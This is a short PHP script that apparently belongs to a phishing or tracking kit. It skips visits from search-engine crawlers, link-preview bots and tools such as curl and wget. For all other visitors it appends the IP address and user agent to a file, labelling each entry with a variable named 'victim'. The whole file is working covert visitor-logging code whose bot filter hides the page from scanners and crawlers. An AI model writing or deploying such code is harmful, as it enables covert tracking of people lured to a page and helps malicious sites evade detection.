<?php

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array("Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebot", "facebookexternalhit", "twitterbot", "TelegramBot", "WhatsApp", "Discordbot", "curl", "wget", "python", "Go-http-client", "Cloudflare-Healthchecks");

$is_bot = false;
foreach ($bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

if (!$is_bot) {
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
    else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
    $useragent = " User-Agent: ";
    $browser = $_SERVER['HTTP_USER_AGENT'];


    $file = 'ip.txt';
    $victim = "IP: ";
    $fp = fopen($file, 'a');

    fwrite($fp, $victim);
    fwrite($fp, $ipaddress);
    fwrite($fp, $useragent);
    fwrite($fp, $browser);


    fclose($fp);
}

